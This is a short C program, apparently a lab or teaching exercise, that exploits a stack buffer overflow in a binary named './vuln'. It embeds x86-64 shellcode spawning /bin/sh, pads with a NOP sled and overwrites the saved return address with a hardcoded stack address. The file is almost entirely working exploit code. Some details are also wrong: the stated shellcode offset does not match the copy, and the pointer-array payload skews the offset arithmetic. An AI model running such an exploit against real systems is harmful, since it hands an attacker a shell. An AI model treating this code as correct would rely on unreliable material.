#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// Shellcode per execve("/bin/sh", NULL, NULL)

unsigned char shellcode[] =
  "\x6a\x3b"                    // push   0x3b
  "\x58"                        // pop    rax
  "\x99"                        // cdq
  "\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x2f"  // mov rbx, "//bin/sh/"
  "\x53"                        // push   rbx
  "\x48\x89\xe7"                // mov    rdi, rsp
  "\x52"                        // push   rdx
  "\x57"                        // push   rdi
  "\x48\x89\xe6"                // mov    rsi, rsp
  "\x0f\x05";                   // syscall

unsigned char* payload[80];

int main() {


    // Preparazione payload
    printf("Indirizzo di payload: %p\n", payload);
    memset(payload, 0x90, sizeof(payload)); // NOP sled

    memcpy(payload, shellcode, sizeof(shellcode)); // shellcode a offset 16

    void *ret_addr = (void*)(0x7fffffffecc0+2); // puntiamo dritti alla shellcode
    memcpy(payload + 72, &ret_addr, 8); // overwrite di RIP
    
    // Corretto: array di stringhe per gli argomenti
    char *args[] = {"./vuln", payload, NULL};
    execve("./vuln", args, NULL);
    perror("execve");  // Se fallisce, stampa errore
    getchar();
    return 1;
}

